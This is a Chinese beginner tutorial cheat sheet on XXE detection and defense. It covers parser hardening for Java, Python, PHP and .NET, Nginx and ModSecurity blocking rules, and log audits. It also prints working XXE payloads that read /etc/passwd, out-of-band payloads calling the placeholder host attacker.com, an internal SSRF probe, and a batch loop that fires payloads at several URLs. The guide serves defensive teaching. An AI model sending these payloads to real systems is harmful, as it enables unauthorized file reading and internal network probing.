---
order: 470
title: XXE 防御与检测
module: 'cybersecurity'
category: 云与基础设施
difficulty: beginner
description: Cybersecurity XXE 防御与检测 的完整教学讲解。
author: fanquanpp
updated: '2026-08-30'
related: []
prerequisites: []
---

## XXE 漏洞检测

**基本写法:发送 XML 实体探测请求**
`curl -X POST -H "Content-Type: application/xml" -d '<payload>' <URL>`
```bash
# 发送包含外部实体的探测 XML
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' https://example.com/api
```

**基本写法:盲 XXE OOB 检测**
`curl -X POST -d '<payload>' <URL>`
```bash
# 带外数据(OOB)盲 XXE 探测
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo>test</foo>' https://example.com/api
```

**基本写法:检查 XML 解析是否报错**
`curl -X POST -d '<malformed>' <URL> -v`
```bash
# 发送畸形 XML 观察错误回显判断解析器
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><foo' https://example.com/api -v
```

**基本写法:测试参数实体**
`curl -X POST -d '<payload>' <URL>`
```bash
# 测试是否支持参数实体 %param
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/detect">%xxe;]><foo>test</foo>' https://example.com/api
```

---

## Java XXE 防护配置

**基本写法:禁用外部实体(Java SAX)**
`factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`
```bash
# Java SAXParserFactory 禁用 DOCTYPE 声明
# factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)
```

**基本写法:禁用外部实体加载**
`factory.setFeature("http://xml.org/sax/features/external-general-entities", false)`
```bash
# 关闭通用外部实体与参数实体
# factory.setFeature("http://xml.org/sax/features/external-general-entities", false)
# factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false)
```

**基本写法:检查 Java 项目是否使用安全 XML**
`grep -r "DocumentBuilderFactory\|SAXParserFactory" <项目目录>`
```bash
# 查找项目中的 XML 解析器使用位置
grep -rn "DocumentBuilderFactory\|SAXParserFactory" src/main/java/
```

**基本写法:Python 安全 XML 解析**
`python3 -c "import defusedxml.ElementTree as ET; ET.parse('<文件>')"`
```bash
# 使用 defusedxml 替代标准库防御 XXE
python3 -c "import defusedxml.ElementTree as ET; ET.parse('input.xml')"
```

**基本写法:Python 标准库禁用实体**
`python3 -c "import xml.etree.ElementTree as ET; parser=ET.XMLParser(); print(parser)"`
```bash
# 检查 Python XML 解析器配置
python3 -c "import xml.etree.ElementTree as ET; parser=ET.XMLParser(resolve_entities=False); print(parser)"
```

---

## PHP XXE 防护配置

**基本写法:检查 libxml 版本**
`php -r "echo LIBXML_VERSION;"`
```bash
# 查看 PHP libxml 版本(2.9+ 默认禁用外部实体)
php -r "echo LIBXML_VERSION;"
```

**基本写法:PHP 禁用实体加载**
`libxml_disable_entity_loader(true)`
```bash
# PHP 中显式禁用外部实体加载
# libxml_disable_entity_loader(true);
```

**基本写法:检查 PHP XML 解析配置**
`php -i | grep -i "libxml\|entity"`
```bash
# 查看 PHP 环境的 libxml 配置
php -i | grep -i "libxml\|entity"
```

**基本写法:PHP 安全解析 XML**
`php -r "libxml_disable_entity_loader(true); $d=new DOMDocument(); $d->loadXML('<x/>');"`
```bash
# PHP DOMDocument 安全加载
php -r "libxml_disable_entity_loader(true); \$d=new DOMDocument(); \$d->loadXML('<x/>', LIBXML_NONET); echo \$d->saveXML();"
```

---

## .NET XXE 防护配置

**基本写法:.NET XmlReader 安全设置**
`XmlReaderSettings settings = new XmlReaderSettings()`
```bash
# .NET 中通过 XmlReaderSettings 防护
# settings.DtdProcessing = DtdProcessing.Prohibit
```

**基本写法:检查 .NET 项目 XML 配置**
`grep -r "XmlReader\|XmlDocument\|XDocument" <项目目录>`
```bash
# 查找 .NET 项目中 XML 处理代码
grep -rn "XmlReader\|XmlDocument\|XDocument" src/
```

**基本写法:.NET Core 默认安全检查**
`dotnet --list-runtimes`
```bash
# 查看 .NET 运行时版本判断默认防护
dotnet --list-runtimes
```

---

## XXE Payload 构造(检测用)

**基本写法:读取文件 payload**
`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///<路径>">]>`
```bash
# 构造读取本地文件的 XXE payload
cat > payload.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
EOF
```

**基本写法:SSRF 探测 payload**
`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://<内网IP>">]>`
```bash
# 利用 XXE 探测内网服务
cat > ssrf.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1/admin">]>
<foo>&xxe;</foo>
EOF
```

**基本写法:编码绕过 payload**
`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/<路径>">]>`
```bash
# 使用 PHP filter 读取文件并 Base64 编码
cat > b64.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]>
<foo>&xxe;</foo>
EOF
```

**基本写法:OOB 外部 DTD payload**
`<!DOCTYPE foo [<!ENTITY % ext SYSTEM "http://<攻击服务器>/<evil.dtd>"> %ext; ]>`
```bash
# 带外数据外传的盲 XXE payload
cat > oob.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % ext SYSTEM "http://attacker.com/evil.dtd"> %ext; ]>
<foo>test</foo>
EOF
```

---

## XXE 检测工具

**基本写法:使用 XXExploiter 生成 payload**
`python3 xxexploiter.py file --xml --file <目标文件>`
```bash
# 使用 XXExploiter 生成 XXE payload
python3 xxexploiter.py file --xml --file /etc/passwd --output payload
```

**基本写法:使用 xxeinjector 批量检测**
`ruby XXEinjector.rb --file <请求文件> --oob http`
```bash
# XXEinjector 进行 OOB 检测
ruby XXEinjector.rb --file request.txt --oob http --http 8080
```

**基本写法:启动监听接收外带数据**
`python3 -m http.server <端口>`
```bash
# 启动 HTTP 服务接收带外数据
python3 -m http.server 8080
```

**基本写法:Burp Collaborator 检测**
`curl -X POST -H "Content-Type: application/xml" -d '<payload>' <URL>`
```bash
# 使用 Burp Collaborator 地址进行盲 XXE 检测
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY x SYSTEM "http://xxx.collaborator.net">]><foo>&x;</foo>' https://example.com/api
```

---

## Nginx/Apache XXE 防护

**基本写法:Nginx 拦截含 DOCTYPE 请求**
`if ($request_body ~* "<!DOCTYPE") { return 403; }`
```bash
# Nginx 拦截包含 DOCTYPE 的 XML 请求
if ($request_body ~* "<!DOCTYPE") {
    return 403;
}
```

**基本写法:Nginx 限制 XML 请求体大小**
`client_body_buffer_size <大小>; client_max_body_size <大小>;`
```bash
# 限制 XML 请求体大小缓解 XXE 攻击
client_body_buffer_size 1k;
client_max_body_size 2k;
```

**基本写法:Apache 拦截外部实体**
`SecRule REQUEST_BODY "!DOCTYPE" ...`
```bash
# Apache ModSecurity 拦截 DOCTYPE 声明
SecRule REQUEST_BODY "@contains <!DOCTYPE" "id:1001,deny,status:403"
```

**基本写法:ModSecurity XXE 规则**
`SecRule REQUEST_BODY "@rx <!ENTITY.*SYSTEM" "deny"`
```bash
# ModSecurity 拦截 ENTITY SYSTEM 声明
SecRule REQUEST_BODY "@rx <!ENTITY\s+.*SYSTEM" "id:1002,deny,status:403,log,msg:'XXE Attack Detected'"
```

---

## XXE 日志审计

**基本写法:检索 XML 请求日志**
`grep -i "application/xml\|text/xml" <访问日志>`
```bash
# 查找所有 XML 类型的请求
grep -i "application/xml\|text/xml" /var/log/nginx/access.log
```

**基本写法:检索含 ENTITY 的可疑请求**
`grep -i "ENTITY\|DOCTYPE" <访问日志>`
```bash
# 检索包含外部实体声明的可疑请求
grep -i "ENTITY\|DOCTYPE" /var/log/nginx/access.log
```

**基本写法:统计 XXE 攻击来源**
`grep -i "DOCTYPE.*ENTITY" <日志> | awk '{print $1}' | sort | uniq -c`
```bash
# 统计 XXE 攻击来源 IP
grep -i "DOCTYPE.*ENTITY" /var/log/nginx/access.log | awk '{print $1}' | sort | uniq -c | sort -rn
```

**基本写法:监控外部实体加载**
`grep -i "file://\|http://.*dtd" <日志>`
```bash
# 监控通过 XXE 加载外部资源的行为
grep -i "file://\|http://.*\.dtd" /var/log/nginx/access.log
```

---

## XXE 防护自检

**基本写法:检测站点 XML 端点**
`curl -s -X POST -H "Content-Type: application/xml" -d '<x/>' -w "%{http_code}" <URL>`
```bash
# 检测接口是否接受 XML 输入
curl -s -X POST -H "Content-Type: application/xml" -d '<x/>' -w "%{http_code}" https://example.com/api -o /dev/null
```

**基本写法:批量检查 XML 端点防护**
`for url in <URL列表>; do curl -s -X POST -H "Content-Type: application/xml" -d '<!DOCTYPE x [<!ENTITY a SYSTEM "file:///etc/hostname">]><x>&a;</x>' "$url"; done`
```bash
# 批量检测多个接口是否存在 XXE
for url in https://a.com/api https://b.com/api; do
  echo "$url: $(curl -s -X POST -H 'Content-Type: application/xml' -d '<!DOCTYPE x [<!ENTITY a SYSTEM "file:///etc/hostname">]><x>&a;</x>' "$url" | head -c 100)"
done
```

**基本写法:验证外部实体是否被禁用**
`curl -X POST -H "Content-Type: application/xml" -d '<!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]><foo>&x;</foo>' <URL>`
```bash
# 验证目标是否正确禁用外部实体
curl -X POST -H "Content-Type: application/xml" -d '<!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]><foo>&x;</foo>' https://example.com/api
```

**基本写法:代码扫描 XML 解析器**
`grep -rn "XMLReader\|SAXParser\|XmlDocument\|DocumentBuilder" <项目目录> --include=*.java`
```bash
# Java 项目扫描 XML 解析器使用情况
grep -rn "XMLReader\|SAXParser\|XmlDocument\|DocumentBuilder" src/ --include=*.java
```
